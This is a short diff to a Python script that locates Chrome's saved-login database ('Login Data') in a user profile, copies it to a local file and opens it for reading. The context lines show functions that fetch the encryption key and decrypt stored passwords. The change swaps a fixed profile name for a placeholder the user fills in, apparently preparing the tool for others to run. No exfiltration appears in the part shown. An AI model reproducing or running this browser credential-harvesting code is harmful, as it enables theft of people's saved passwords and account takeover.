@@ -42,7 +42,7 @@ def decrypt_password(password, key):
 def main():
     try:
         key = get_encryption_key()
-        db_path = os.path.join(os.environ["USERPROFILE"], "AppData", "Local", "Google", "Chrome", "User Data", "Profile 1", "Login Data")
+        db_path = os.path.join(os.environ["USERPROFILE"], "AppData", "Local", "Google", "Chrome", "User Data", "PLEASE_ADD_YOUR_PROFILE_N0(Example: Profile 1, Profile 2,...)", "Login Data")
         temp_db_path = "Chromedata.db"
         shutil.copyfile(db_path, temp_db_path)
         db = sqlite3.connect(temp_db_path)
